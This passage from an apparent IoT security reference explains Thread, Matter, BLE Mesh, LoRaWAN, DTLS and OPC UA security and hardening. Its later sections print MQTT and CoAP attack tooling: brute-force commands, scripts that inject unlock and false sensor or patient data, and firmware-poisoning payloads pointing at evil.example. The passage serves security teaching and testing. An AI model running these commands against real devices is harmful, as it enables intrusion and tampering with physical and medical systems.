- Restrict GATT characteristic permissions -- read/write only after authentication
- Use random resolvable private addresses (RPA) to prevent tracking
- Apply SweynTooth patches for affected SoC vendors

---

## 7. Thread and Matter

### 7.1 Thread -- network security

Thread's network stack: IEEE 802.15.4 (PHY/MAC) > 6LoWPAN (IPv6 header compression and fragmentation) > IPv6 (with Thread-specific routing: MLE -- Mesh Link Establishment -- for neighbor discovery and route maintenance) > UDP (the primary transport) > CoAP (the primary application protocol) and DTLS (for secured communication).

**Thread security layers.** MAC-layer security: 802.15.4 MAC frames are encrypted and authenticated with a MAC key (derived from the Thread Network Master Key). The MAC key provides hop-by-hop protection (each router decrypts, processes, and re-encrypts). MLE security: MLE frames (used for neighbor discovery, link establishment, and route advertisements) are encrypted with an MLE key (also derived from the Network Master Key). The Network Master Key is the root secret -- all MAC and MLE keys are derived from it.

**Commissioner and Joiner.** The **Commissioner** (a device authorized by the Thread Leader to add new devices -- typically a smartphone app or a Border Router's management interface) authenticates **Joiners** (new devices requesting to join). The commissioning protocol:

1. The user enters the Joiner's credential (a passphrase -- typically from a label or QR code) into the Commissioner.
2. The Commissioner establishes a DTLS session with the Joiner using J-PAKE (Password-Authenticated Key Exchange by Juggling -- a PAKE protocol that uses the passphrase as the shared secret). J-PAKE provides mutual authentication and key agreement without transmitting the passphrase.
3. Over the DTLS session, the Commissioner sends the Thread Network Master Key (and other configuration: PAN ID, channel, Extended PAN ID, network name) to the Joiner.
4. The Joiner installs the Network Master Key and joins the network.

The DTLS+JPAKE commissioning is secure against eavesdropping and MitM (assuming the Joiner credential has sufficient entropy -- short numeric passphrases may be brute-forceable offline if an attacker captures the JPAKE exchange).

**Thread Border Router security.** The Border Router connects the Thread mesh to IP networks (Wi-Fi, Ethernet). It performs: NAT64 (Thread IPv6 to external IPv4 translation), DNS-SD proxy (mDNS/DNS-SD bridging), and routing between Thread and external networks. The Border Router is a security boundary -- its compromise exposes the Thread mesh to external attacks and enables pivoting into the home/enterprise network.

### 7.2 Matter -- deep dive

**Device attestation.** Every Matter-certified device has a Device Attestation Certificate (DAC) signed by a Product Attestation Intermediate (PAI) CA, which is signed by a Product Attestation Authority (PAA) root CA. During commissioning, the device proves it possesses the DAC's private key (by signing a challenge from the Commissioner). The Commissioner verifies the certificate chain to a trusted PAA root. This ensures the device is a genuine, certified Matter device -- not a clone or a counterfeit.

**PASE (Passcode Authenticated Session Establishment).** Used for initial commissioning (before the device has operational certificates). The protocol:

1. The Commissioner and the device exchange SPAKE2+ protocol messages. SPAKE2+ (a PAKE) uses the setup passcode (a numeric code from the device's label or QR code) as the shared secret. SPAKE2+ protocol: the Commissioner computes `pA = w0 * M + scalarmult(random_a, P256_generator)` and sends pA; the device computes `pB = w0 * N + scalarmult(random_b, P256_generator)` and sends pB (where w0 is derived from the passcode, M and N are fixed SPAKE2+ parameters on P-256). Both parties derive the shared secret from the DH exchange, authenticated by the passcode.
2. The shared secret is used to derive session encryption keys (via HKDF).
3. The Commissioner and device communicate securely over the PASE session -- the Commissioner provisions the device with its operational certificate (NOC -- Node Operational Certificate) and the fabric's Root CA certificate (RCAC -- Root CA Certificate).

**CASE (Certificate Authenticated Session Establishment).** Used for all subsequent communication (after commissioning). CASE is a Sigma-I-like authenticated key exchange:

1. The initiator sends a Sigma1 message: random nonce, session ID, destination node ID, initiator's ephemeral ECDH public key, and optionally a resumption ID (for session resumption).
2. The responder sends a Sigma2 message: random nonce, responder's ephemeral ECDH public key, and an encrypted payload containing: the responder's NOC, the responder's intermediate CA certificate (ICAC, if any), and a TBS (To-Be-Signed) signature over (responder's NOC + initiator's nonce + responder's ephemeral public key + initiator's ephemeral public key), signed with the responder's NOC private key.
3. The initiator verifies the responder's certificate chain (NOC > ICAC > RCAC), verifies the TBS signature, and sends a Sigma3 message: encrypted payload containing the initiator's NOC, ICAC, and TBS signature (signed with the initiator's NOC private key).
4. The responder verifies the initiator's certificate chain and TBS signature.
5. Both parties derive session keys from the ECDH shared secret (via HKDF).

**Matter fabric model.** A fabric is a logical administrative domain -- all devices commissioned by the same Commissioner share a fabric. Each fabric has a root CA (the RCAC), and each device has a NOC signed by the fabric's CA. Multi-admin: a device can be part of multiple fabrics (e.g., the same smart lock can be managed by both the homeowner's Apple Home fabric and Google Home fabric), each with independent certificates and access controls.

**ACL enforcement.** Each device maintains an Access Control List specifying which fabric nodes can invoke which clusters (command groups) at which access level (View, Operate, Manage, Administer). Default: the Commissioner has Administer access; other devices have no access until ACL entries are created. This provides fine-grained authorization within the Matter ecosystem.

**Matter bridge security.** A Matter bridge connects non-Matter devices (Zigbee, Z-Wave, proprietary) to the Matter fabric. The bridge translates between Matter's security model (certificates, CASE) and the legacy protocol's security (Zigbee network keys, Z-Wave S2 keys). The bridge is a translation point -- its compromise would expose both the Matter fabric and the legacy devices.

---

## 8. BLE Mesh -- comprehensive

### 8.1 Provisioning protocol

BLE Mesh provisioning adds a new (unprovisioned) device to the mesh. The protocol has five phases:

**Phase 1: Beaconing.** The unprovisioned device broadcasts Unprovisioned Device beacons (BLE advertisements with the Mesh Provisioning UUID). The provisioner (typically a smartphone app) scans for beacons.

**Phase 2: Invitation.** The provisioner sends a Provisioning Invite PDU (indicating the attention duration -- how long the device should identify itself, e.g., by blinking an LED). The device responds with a Provisioning Capabilities PDU (listing: number of elements, supported algorithms [FIPS P-256 ECDH], supported OOB types [static OOB, output OOB, input OOB], input/output OOB actions [blink, beep, vibrate, push, twist, display numeric, display alphanumeric, enter numeric, enter alphanumeric]).

**Phase 3: Public Key Exchange.** The provisioner and device exchange ECDH public keys (on the NIST P-256 curve). If OOB public-key exchange is supported (e.g., via NFC or QR code), the public keys are exchanged out-of-band (preventing MitM on the BLE link). If only in-band exchange is supported, the public keys are sent over the BLE Provisioning Bearer -- vulnerable to MitM if no OOB authentication follows.

**Phase 4: Authentication.** Based on the agreed OOB method: **Output OOB**: the device displays or outputs a value (blinks N times, displays a number); the user enters this value on the provisioner. **Input OOB**: the provisioner displays a value; the user enters it on the device (pushes a button N times, enters a number). **Static OOB**: a pre-shared static value (from the device's label) is entered on the provisioner. **No OOB**: no authentication -- the ECDH exchange is unauthenticated, and a MitM can substitute their own public key. The authentication value is used in the key-confirmation step (the provisioner and device both compute a confirmation value using AES-CMAC over the ECDH shared secret and the authentication value; a mismatch indicates MitM or incorrect OOB entry).

**Phase 5: Distribution of provisioning data.** Over the ECDH-derived encrypted channel, the provisioner sends: the NetKey (network key), the Key Index, flags (Key Refresh, IV Update), the IV Index, and the Unicast Address for the device.

### 8.2 BLE Mesh message security

**Network layer.** Each mesh message is encrypted and authenticated with a network key (NetKey) using AES-128-CCM. The nonce is constructed from: the message type, the TTL, the SEQ (24-bit sequence number, per-source), the SRC (source unicast address), and the IV Index (32-bit value, incremented periodically). The NID (7-bit Network Identifier, derived from the NetKey) is included in the network header.

**Transport layer.** Handles segmentation (messages longer than 15 bytes are split into segments) and reassembly. Provides the application-layer encryption interface.

**Access layer.** Application data is encrypted with an AppKey using AES-128-CCM. The AppKey is independent of the NetKey: a message is double-encrypted (first with AppKey at the access layer, then with NetKey at the network layer). This separation ensures that relay nodes (which have the NetKey but not necessarily the AppKey) can relay messages without reading their application content.

### 8.3 BLE Mesh attacks

**NetKey compromise.** If an attacker obtains the NetKey (via firmware extraction from a compromised node, or via provisioning MitM), they can: decrypt all network-layer headers, inject authenticated network-layer messages, and relay or block messages. They cannot decrypt application-layer data (AppKey-encrypted) unless they also obtain the AppKey.

**Replay attacks via IV Index.** The IV Index is a 32-bit counter incremented by the network when the sequence-number space approaches exhaustion (SEQ is 24-bit). If the IV Index rolls back (due to a reset or protocol bug), old messages become replayable. IV Index must be monotonically increasing.

**Provisioning MitM (No OOB).** If the provisioner and device use "No OOB" authentication, the ECDH exchange is unauthenticated. An active attacker can intercept the provisioner's public key, substitute their own, establish separate ECDH sessions with both parties, and relay provisioning data. The attacker obtains the NetKey and AppKey.

---

## 9. LoRaWAN -- comprehensive

### 9.1 PHY layer

LoRa uses CSS (Chirp Spread Spectrum) modulation: the signal frequency sweeps linearly across the bandwidth. Data is encoded in the chirp's starting frequency offset. **Spreading Factors (SF7-SF12)** trade data rate for range: SF7 (5.5 kbps at 125 kHz BW, ~2 km urban) to SF12 (0.3 kbps, ~15 km urban/45 km rural). SFs are orthogonal: transmissions at different SFs on the same channel do not interfere.

### 9.2 LoRaWAN 1.0.x security

**Key hierarchy.** The root key is the **AppKey** (128-bit AES, pre-shared between device and network/application server). Two session keys are derived during Join:

**NwkSKey (Network Session Key):** MIC calculation on MAC-layer header and payload, optionally encrypting the FOpts field.

**AppSKey (Application Session Key):** encrypting the FRMPayload (application data). The AppSKey provides end-to-end encryption between device and application server -- the network server cannot decrypt application payloads.

**Join procedure (OTAA).** The device sends a **Join-Request** containing: AppEUI (8 bytes), DevEUI (8 bytes), and DevNonce (2 bytes -- unique per join attempt). MIC'd with the AppKey. The network server verifies the MIC, checks DevNonce uniqueness, and sends a **Join-Accept**: AppNonce (3 bytes), NetID (3 bytes), DevAddr (4 bytes), DLSettings, RxDelay, optional CFList. The Join-Accept is encrypted with AES-128-ECB using AppKey.

**Session key derivation.** `NwkSKey = AES-128-ECB(AppKey, 0x01 | AppNonce | NetID | DevNonce | pad)`. `AppSKey = AES-128-ECB(AppKey, 0x02 | AppNonce | NetID | DevNonce | pad)`.

**Encryption.** The FRMPayload is encrypted using AES-128-CTR mode. Encryption key: AppSKey if FPort > 0, NwkSKey if FPort = 0 (MAC commands).

### 9.3 LoRaWAN attacks

**ABP replay.** ABP devices use static session keys and may reset their frame counter on power cycle. If the network server accepts counter resets, the attacker can replay captured frames. Defense: enforce strict counter monotonicity; LoRaWAN 1.1 requires persistent frame-counter storage.

**Bit-flipping on FOpts.** In LoRaWAN 1.0.x, the FOpts field is not encrypted (only MIC-protected). If the attacker knows the plaintext (MAC commands have fixed formats), theoretical attacks on MIC computation exist.

**ACK spoofing.** For confirmed uplinks, an attacker jams the legitimate ACK and sends a spoofed ACK, causing the device to believe the message was delivered.

**ADR spoofing.** Forged LinkADRReq commands can: increase SF/TX power (drain battery), decrease TX power (lose connectivity), or change channel (effective DoS). Requires NwkSKey for MIC.

**Gateway impersonation.** The original Semtech UDP Packet Forwarder uses unencrypted UDP between gateway and network server. An attacker can: impersonate a gateway, intercept downlinks, and perform wormhole attacks (relay packets between locations).

**Tooling.**

```bash
# GNU Radio LoRa receiver (gr-lora)
# Capture LoRa packets on 868.1 MHz, SF7, BW 125 kHz
gnuradio-companion  # Load gr-lora flow graph
# Or use LoRa-SDR command-line decoder

# ChirpStack — open-source LoRaWAN network server for protocol analysis
# Deploy locally for traffic inspection and key management testing
docker-compose -f chirpstack/docker-compose.yml up
```

### 9.4 LoRaWAN 1.1 improvements

LoRaWAN 1.1 separates the key hierarchy: **NwkKey** (network-layer) and **AppKey** (application-layer) are independent root keys. Session key derivation produces four keys: NwkSEncKey, SNwkSIntKey, FNwkSIntKey, and AppSKey. Adds: the **Join Server** (dedicated entity for Join procedures), the **ReKey** command (session-key refresh without full rejoin), and the **rejoin** mechanism (periodic rejoin requests).

### 9.5 LoRaWAN hardening

- Use OTAA exclusively -- never ABP in production
- Enforce persistent frame counters (reject counter resets)
- Deploy Basics Station or CUPS/LNS with TLS for gateway-to-server communication
- Implement ADR request validation on the network server
- Use LoRaWAN 1.1 when device firmware supports it
- Monitor for anomalous join request patterns (replay attempts, DevNonce reuse)

---

## 10. DTLS -- Datagram Transport Layer Security

### 10.1 Protocol mechanics

DTLS (RFC 6347 for DTLS 1.2, RFC 9147 for DTLS 1.3) provides TLS-equivalent security over UDP. Used by CoAP, Thread, LwM2M, and other IoT protocols that require unreliable transport.

**Key differences from TLS.** DTLS adds: explicit sequence numbers in the record layer (UDP does not guarantee ordering), a retransmission timer for handshake messages (UDP does not guarantee delivery), a cookie exchange (HelloVerifyRequest/HelloRetryRequest) to prevent DoS via spoofed source IPs, and epoch numbers (incremented on each key change to disambiguate records encrypted with different keys).

**DTLS handshake (1.2).**

1. ClientHello (with cookie placeholder)
2. HelloVerifyRequest (server sends cookie -- stateless DoS mitigation)
3. ClientHello (with cookie)
4. ServerHello, Certificate, ServerKeyExchange, CertificateRequest (optional), ServerHelloDone
5. Certificate (optional), ClientKeyExchange, CertificateVerify (optional), ChangeCipherSpec, Finished
6. ChangeCipherSpec, Finished

**Session resumption.** DTLS supports session ID resumption and session tickets (RFC 5077) to avoid full handshake on reconnection -- critical for constrained IoT devices that reconnect frequently (sleep/wake cycles).

**Connection ID extension (RFC 9146).** Allows DTLS connections to survive NAT rebinding and IP address changes without renegotiation. The CID is included in the DTLS record header, binding the record to the connection regardless of the source IP/port. Essential for mobile IoT devices and NB-IoT (which experiences frequent NAT rebinding).

### 10.2 IoT constraints

Full DTLS handshake requires 6 round trips and ~2KB of handshake data -- expensive for constrained devices (Class 0/1 per RFC 7228). Mitigations: session resumption (1 round trip), raw public keys (RFC 7250) instead of X.509 certificates (reduces certificate size from ~1KB to ~100 bytes), DTLS 1.3 (reduces handshake to 1 round trip for full handshake, 0-RTT for resumption).

**DTLS-SRTP for IoT voice.** Some IoT intercom and voice-assistant devices use DTLS-SRTP for real-time encrypted audio. The DTLS handshake negotiates SRTP keys; subsequent audio uses SRTP (no DTLS overhead per audio packet).

---

## 11. LwM2M -- OMA Lightweight M2M

### 11.1 Architecture

LwM2M (OMA SpecWorks) defines a device management protocol for IoT devices. Architecture: LwM2M Client (the IoT device), LwM2M Server (management server), LwM2M Bootstrap Server (initial provisioning server). Transport: CoAP over UDP (optionally with DTLS), or CoAP over TCP/TLS.

**Object model.** LwM2M defines standardized objects: Object 0 (Security -- server URI, bootstrap server flag, security mode, public key/certificate, secret key), Object 1 (Server -- lifetime, notification settings), Object 3 (Device -- manufacturer, model, serial, firmware version, reboot, factory reset), Object 5 (Firmware Update -- package URI, update state, update result).

### 11.2 Security modes

| Mode | Mechanism | Use Case |
|------|-----------|----------|
| PSK | DTLS with Pre-Shared Key | Mass-manufactured devices with per-device PSK |
| RPK | DTLS with Raw Public Key | Devices with asymmetric key storage |
| Certificate | DTLS with X.509 | Enterprise deployments |
| NoSec | No DTLS (plaintext CoAP) | Testing only -- never production |

### 11.3 Bootstrap security

The bootstrap process provisions the LwM2M Client with server credentials. **Factory bootstrap:** credentials are pre-provisioned during manufacturing (most secure -- no over-the-air key exchange). **Client-initiated bootstrap:** the device contacts the Bootstrap Server using a bootstrap PSK/RPK/certificate; the Bootstrap Server writes Security objects (server URIs, keys) to the device. **Server-initiated bootstrap:** the Bootstrap Server pushes configuration to the device (requires the device to be reachable -- less common in constrained networks).

**Firmware update security.** Object 5 manages firmware updates. The server provides a firmware package URI; the client downloads and installs it. Security depends on: TLS/DTLS for download integrity, firmware image signing (the client verifies the image signature before installation), and rollback protection (the client rejects firmware with a version number lower than the current).

**Attacks.** Bootstrap server impersonation (if the bootstrap PSK is weak or reused across devices, an attacker spoofs the Bootstrap Server and provisions malicious server credentials). Firmware update TOCTOU (Time-of-Check-Time-of-Use): the device verifies the firmware image, but the image is swapped between verification and installation (requires local access or a compromised download path).

---

## 12. OPC UA in IoT context

### 12.1 Security modes

OPC UA (IEC 62541) defines three security modes: None (no security -- discovery only), Sign (messages are signed but not encrypted), SignAndEncrypt (messages are signed and encrypted). Security policies specify the algorithms: Basic256Sha256 (AES-256-CBC + RSA-SHA256 -- minimum recommended), Aes128_Sha256_RsaOaep, Aes256_Sha256_RsaPss.

### 12.2 Certificate management

OPC UA uses X.509 certificates for mutual authentication. Each server and client has a certificate. Trust is managed via application-instance certificates stored in trust lists. Common issues in IoT deployments: self-signed certificates accepted without validation, expired certificates ignored, trust lists not maintained (any certificate accepted), private keys stored unprotected in filesystem.

### 12.3 Session exploitation

OPC UA sessions are stateful. Attacks: session hijacking (if Security Mode is None, the session token is transmitted in cleartext -- the attacker steals the token and issues commands), unauthorized browse (enumerate the OPC UA address space -- discover all nodes, variables, methods), unauthorized read/write of process variables (read sensor values, write actuator setpoints -- physical process manipulation).

**Hardening.**
- Enforce SignAndEncrypt with Basic256Sha256 minimum
- Use PKI-managed certificates -- no self-signed in production
- Implement least-privilege access control per user and per node
- Audit all session creation and method calls
- Segment OPC UA traffic from IT networks (Purdue Model Level 2/3 boundary)

---

## 13. Sigfox, NB-IoT, LTE-M

### 13.1 Sigfox

Sigfox is an ultra-narrowband (100 Hz per channel) LPWAN. Uplink: 140 messages/day maximum, 12 bytes payload, transmitted at 100 bps. Downlink: 4 messages/day maximum, 8 bytes payload.

Security: each device has a unique device ID and a symmetric key (provisioned at manufacturing). Uplink messages include a sequence number (for replay detection) and a MAC (AES-128-based). The base Sigfox protocol does not encrypt the payload -- application-layer encryption is the device manufacturer's responsibility.

### 13.2 NB-IoT and LTE-M

NB-IoT (Cat-NB1/NB2) and LTE-M (Cat-M1) are 3GPP cellular IoT standards. Security inherits from LTE: mutual authentication via AKA (USIM K + network authentication vectors), user-plane encryption (SNOW-3G, AES-128-CTR, or ZUC), signaling-plane integrity (AES-128-CMAC or SNOW/ZUC-based).

**CIoT EPS optimization.** For small, infrequent data, CIoT EPS optimization allows data in the control plane (piggybacked on NAS signaling), protected by NAS-layer encryption and integrity.

**NIDD (Non-IP Data Delivery).** Raw data (not IP packets) in NAS messages, delivered via SCEF. NIDD eliminates the IP stack -- reducing attack surface (no TCP/UDP/IP vulnerabilities, no DNS, no DHCP, no ARP).

---

## 14. IoT protocol comparison matrix

| Protocol | Transport | Range | Data Rate | Power | Security Model | Mesh | Typical Use Case |
|----------|-----------|-------|-----------|-------|----------------|------|------------------|
| MQTT | TCP/IP | WAN | N/A (IP) | Medium | TLS + ACLs | No | Cloud telemetry, building automation |
| CoAP | UDP/IP | WAN | N/A (IP) | Low | DTLS | No | Constrained REST APIs, sensor reporting |
| AMQP | TCP/IP | WAN | N/A (IP) | Medium | TLS + SASL | No | Enterprise messaging, industrial IoT |
| Zigbee | 802.15.4 | 10-100m | 250 kbps | Very Low | AES-128-CCM* NWK/APS keys | Yes | Home automation, smart lighting |
| Z-Wave | G.9959 | 30-100m | 100 kbps | Very Low | AES-128 S0/S2 | Yes | Home automation, security systems |
| BLE | BT 4.0+ | 10-100m | 2 Mbps | Very Low | AES-CCM LE SC pairing | No* | Wearables, healthcare, beacons |
| BLE Mesh | BT 4.0+ | Mesh ext. | 2 Mbps | Low | AES-CCM NetKey/AppKey | Yes | Lighting, building automation |
| Thread | 802.15.4 | 10-100m | 250 kbps | Very Low | AES-CCM + DTLS | Yes | Smart home (Matter transport) |
| LoRaWAN | LoRa CSS | 2-15 km | 0.3-27 kbps | Ultra Low | AES-128 NwkSKey/AppSKey | No | Agriculture, smart cities, metering |
| Sigfox | UNB | 10-50 km | 100 bps | Ultra Low | AES-128 MAC (no encryption) | No | Asset tracking, simple sensors |
| NB-IoT | LTE | Cellular | 250 kbps | Low | LTE AKA + SNOW/AES/ZUC | No | Smart metering, industrial sensors |
| LTE-M | LTE | Cellular | 1 Mbps | Low | LTE AKA + SNOW/AES/ZUC | No | Wearables, fleet tracking, voice |

*BLE does not natively mesh; BLE Mesh is a separate specification layered on BLE advertising.

---

## 15. IoT gateway security

### 15.1 Gateway attack surface

IoT gateways perform protocol translation (Zigbee/Z-Wave/BLE to IP), edge compute, and upstream cloud communication. They are a high-value target -- compromise yields access to both the IoT network and the IP network.

**Protocol translation attacks.** The gateway decrypts IoT protocol traffic (Zigbee network key, Z-Wave S2 keys, BLE session keys) and re-encrypts for IP transport (TLS to cloud). The cleartext exists in gateway memory during translation. An attacker with code execution on the gateway can intercept all IoT protocol traffic in cleartext.

**Edge compute exploitation.** Gateways running edge analytics (ML inference, rule engines) have larger attack surfaces: container runtimes, scripting engines, OS services. Vulnerabilities in edge compute software provide code execution on the gateway.

**Gateway as pivot point.** The gateway bridges the IoT network (typically isolated) and the LAN/WAN. A compromised gateway enables: lateral movement into the LAN, command injection into IoT devices (sending malicious Zigbee/Z-Wave commands), data exfiltration (sensor data, camera feeds), and upstream manipulation (forging telemetry to cloud services).

### 15.2 Gateway hardening

- Enforce secure boot and verified boot chain (prevent firmware tampering)
- Encrypt IoT protocol keys at rest (use hardware security module or TEE if available)
- Minimize attack surface: disable unused services, remove debug interfaces (UART, JTAG)
- Apply OS hardening: mandatory access control (SELinux/AppArmor), namespace isolation for edge compute
- Implement mutual TLS for cloud communication
- Deploy intrusion detection at the gateway (monitor for anomalous IoT traffic patterns)
- Enforce firmware update integrity (signed updates, rollback protection)
- Segment gateway management interface from IoT and LAN traffic

---

## 16. IoT network segmentation

### 16.1 VLAN isolation

Separate IoT devices from enterprise/home networks using VLANs:

```
VLAN 10  — Corporate LAN (workstations, servers)
VLAN 20  — IoT Sensors (read-only telemetry devices)
VLAN 30  — IoT Actuators (devices with physical control capability)
VLAN 40  — IoT Management (gateways, controllers, provisioning systems)
VLAN 50  — Guest/Untrusted
```

Inter-VLAN routing rules: VLAN 20/30 can reach VLAN 40 (gateway) only on required ports. VLAN 20/30 cannot reach VLAN 10 (no IoT-to-corporate lateral movement). VLAN 40 can reach the internet (cloud MQTT/CoAP endpoints) via firewall with destination whitelisting.

### 16.2 Micro-segmentation

For environments with diverse IoT device types, micro-segmentation provides per-device or per-device-class policy enforcement:

- Software-defined networking (SDN) controllers assign per-device ACLs based on MAC or 802.1X identity
- Each device class (cameras, thermostats, locks) gets a unique security policy
- East-west traffic between IoT devices is denied by default -- only explicitly permitted flows are allowed

### 16.3 Network Access Control (NAC) for IoT

IoT devices typically cannot run 802.1X supplicants. Alternative NAC approaches:

**MAC Authentication Bypass (MAB).** The switch authenticates devices by MAC address against a RADIUS server. Weak (MAC addresses are spoofable) but provides basic segmentation. Combine with dynamic VLAN assignment per device profile.

**MUD (Manufacturer Usage Description, RFC 8520).** The device emits a MUD URL (via DHCP option, LLDP, or 802.1X) pointing to a MUD file that describes the device's expected network behavior (allowed destinations, protocols, ports). The NAC system enforces the MUD profile. MUD provides manufacturer-intended segmentation without per-device manual configuration.

**Network behavior profiling.** Passive traffic analysis identifies device types by traffic patterns (DNS queries, connection intervals, payload sizes). The NAC system classifies devices and assigns appropriate VLAN/ACL. Tools: Cisco ISE IoT profiling, Forescout eyeSight, open-source implementations using Zeek/Suricata logs.

---

## 17. MQTT Exploitation Tools

### 17.1 Mosquitto client enumeration

Core commands for broker reconnaissance (see section 1.3 for context):

```bash
# Subscribe to ALL topics — full traffic capture
mosquitto_sub -h <broker> -t '#' -v

# Subscribe to $SYS for broker fingerprinting
mosquitto_sub -h <broker> -t '$SYS/#' -v

# Publish arbitrary payload to a target topic
mosquitto_pub -h <broker> -t <topic> -m <payload>

# Publish with QoS 2 and retain flag (persistent injection)
mosquitto_pub -h <broker> -t 'device/cmd' -m '{"action":"unlock"}' -q 2 -r

# Publish with specific client ID to hijack a persistent session
mosquitto_pub -h <broker> -t 'dummy' -m 'x' -i 'legitimate-device-001'
```

### 17.2 Python paho-mqtt exploitation

```python
#!/usr/bin/env python3
"""MQTT broker reconnaissance and command injection via paho-mqtt."""
import paho.mqtt.client as mqtt
import json, sys, time

BROKER = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1883
discovered_topics = set()

def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print(f"[+] Connected to {BROKER}:{PORT}")
        client.subscribe("#", qos=0)        # all application topics
        client.subscribe("$SYS/#", qos=0)   # broker metadata
    else:
        print(f"[-] Connection failed: rc={rc}")

def on_message(client, userdata, msg):
    topic = msg.topic
    if topic not in discovered_topics:
        discovered_topics.add(topic)
        print(f"[NEW TOPIC] {topic}")
    payload = msg.payload.decode(errors="replace")
    print(f"  {topic} → {payload[:200]}")

client = mqtt.Client(client_id="recon-" + str(int(time.time())))
client.on_connect = on_connect
client.on_message = on_message

# Optional: supply credentials for authenticated brokers
# client.username_pw_set("admin", "password")

client.connect(BROKER, PORT, keepalive=60)

try:
    client.loop_forever()
except KeyboardInterrupt:
    print(f"\n[*] Discovered {len(discovered_topics)} unique topics")
    client.disconnect()
```

### 17.3 $SYS topic fingerprinting

Key `$SYS` topics for broker identification:

| $SYS Topic | Intelligence Value |
|---|---|
| `$SYS/broker/version` | Exact broker software + version (CVE matching) |
| `$SYS/broker/clients/total` | Fleet size estimation |
| `$SYS/broker/clients/active` | Active device count |
| `$SYS/broker/clients/maximum` | Max concurrent — capacity planning |
| `$SYS/broker/messages/received` | Message volume profiling |
| `$SYS/broker/messages/sent` | Outbound traffic volume |
| `$SYS/broker/uptime` | Broker stability / restart detection |
| `$SYS/broker/subscriptions/count` | Subscription density |
| `$SYS/broker/load/messages/received/1min` | Real-time load |
| `$SYS/broker/clients/connected` | Current session count |

### 17.4 MQTT authentication brute-force

```bash
# Hydra against MQTT broker (requires hydra with MQTT module, v9.4+)
hydra -L users.txt -P passwords.txt <broker_ip> mqtt -s 1883 -V

# Ncrack alternative (if hydra MQTT module unavailable)
ncrack -p 1883 --user admin --pass /usr/share/wordlists/rockyou.txt <broker_ip>

# Manual credential spray via mosquitto_sub (scripted)
for user in admin root device sensor gateway; do
  for pass in admin password 1234 default ""; do
    mosquitto_sub -h <broker> -u "$user" -P "$pass" -t '$SYS/broker/version' \
      -C 1 -W 3 2>/dev/null && echo "[+] VALID: $user:$pass" || true
  done
done
```

### 17.5 Topic injection and message tampering

Attack scenarios against common IoT MQTT topic hierarchies:

```bash
# Smart home — unlock front door
mosquitto_pub -h <broker> -t 'home/frontdoor/lock/set' -m '{"command":"UNLOCK"}'

# Industrial — spoof sensor reading to suppress alarm
mosquitto_pub -h <broker> -t 'factory/line3/pressure' \
  -m '{"value":2.1,"unit":"bar","ts":"2026-05-09T12:00:00Z"}'

# Medical — inject false patient telemetry
mosquitto_pub -h <broker> -t 'ward/room12/vitals' \
  -m '{"hr":72,"spo2":98,"bp":"120/80"}' -q 2 -r

# Retained message poisoning — persist malicious payload
mosquitto_pub -h <broker> -t 'device/config/update' \
  -m '{"firmware_url":"http://evil.example/backdoor.bin"}' -r
```

### 17.6 Key MQTT CVEs

**CVE-2017-7653 (Mosquitto DoS).** Crafted SUBSCRIBE packet with a topic filter containing a UTF-8 multi-byte sequence at the maximum topic length boundary causes a heap buffer over-read, crashing the broker. Affected: Mosquitto < 1.4.15. CVSSv3: 7.5. CWE-125 (Out-of-bounds Read).

**CVE-2018-12543 (Mosquitto auth bypass).** When the `per_listener_settings` option is enabled, a client connecting to a listener without an authentication plugin configured bypasses authentication entirely, gaining full publish/subscribe access. Affected: Mosquitto 1.5-1.5.2. CVSSv3: 8.1. CWE-287.

**CVE-2018-12546 (Mosquitto ACL bypass).** Under specific ACL configurations, a client that publishes to a denied topic does not receive a PUBACK rejection but the message is silently dropped — except when the `mount_point` option is used, in which case the ACL check is bypassed. Affected: Mosquitto < 1.5.6. CVSSv3: 6.5. CWE-863.

---

## 18. CoAP Exploitation

### 18.1 CoAPthon3 resource discovery and enumeration

```python
#!/usr/bin/env python3
"""CoAP resource discovery and enumeration via CoAPthon3."""
from coapthon.client.helperclient import HelperClient

TARGET = "coap://192.168.1.100:5683"
client = HelperClient(server=("192.168.1.100", 5683))

# Phase 1: discover all resources
response = client.get("/.well-known/core")
print("[+] Discovered resources:")
print(response.payload)

# Phase 2: enumerate each discovered resource
for line in response.payload.split(","):
    path = line.split(";")[0].strip("<>/ ")
    if path:
        r = client.get(path)
        print(f"  GET /{path} → [{r.code}] {r.payload[:100]}")

# Phase 3: attempt PUT injection on writable resources
client.put("actuators/led", payload='{"state":"on"}')
client.post("config/update", payload='{"firmware":"http://evil.example/fw.bin"}')

client.stop()
```

### 18.2 Scapy CoAP packet crafting

```python
#!/usr/bin/env python3
"""CoAP packet crafting with Scapy for protocol fuzzing and injection."""
from scapy.all import *
from scapy.contrib.coap import CoAP

# Basic CoAP GET to /.well-known/core
pkt = IP(dst="192.168.1.100") / UDP(sport=RandShort(), dport=5683) / \
      CoAP(type=0, code=1, msg_id=RandShort(),
           options=[("Uri-Path", b".well-known"), ("Uri-Path", b"core")])
resp = sr1(pkt, timeout=5)
if resp and resp.haslayer(CoAP):
    print(f"[+] Response code: {resp[CoAP].code}")
    print(f"[+] Payload: {resp[CoAP].payload}")

# CoAP PUT injection — write to an actuator resource
inject = IP(dst="192.168.1.100") / UDP(sport=RandShort(), dport=5683) / \
         CoAP(type=0, code=3, msg_id=RandShort(),
              options=[("Uri-Path", b"actuators"), ("Uri-Path", b"valve"),
                       ("Content-Format", b"\x32")],  # application/json
              payload=b'{"state":"open"}')
send(inject)
```

### 18.3 CoAP amplification attack

CoAP amplification exploits the asymmetry between small requests and large responses. The attacker sends a GET request to `/.well-known/core` with a spoofed source IP (the victim's IP). Every CoAP device on the network responds to the victim.

```bash
# aiocoap — multicast discovery (amplification vector)
python3 -m aiocoap.cli.client GET coap://224.0.1.187/.well-known/core

# Amplification factor calculation:
# Request: ~50 bytes (CoAP GET + URI option)
# Response: ~2000-8000 bytes (link-format resource directory)
# Factor: 40x-160x per responding device
# With 100 devices on a /24: 4000x-16000x aggregate amplification
```

Mitigation: disable multicast CoAP, rate-limit responses, block inbound CoAP from untrusted sources.

### 18.4 aiocoap async exploitation

```python
#!/usr/bin/env python3
"""Async CoAP enumeration and observe-based data exfiltration."""
import asyncio
from aiocoap import Context, Message, GET, PUT, CONTENT

async def exploit(target: str):
    ctx = await Context.create_client_context()

    # Discovery
    req = Message(code=GET, uri=f"coap://{target}/.well-known/core")
    resp = await ctx.request(req).response
    print(f"[+] Resources: {resp.payload.decode()}")

    # Observe — subscribe to sensor updates (persistent exfiltration)
    obs_req = Message(code=GET, uri=f"coap://{target}/sensors/temp", observe=0)
    obs = ctx.request(obs_req)
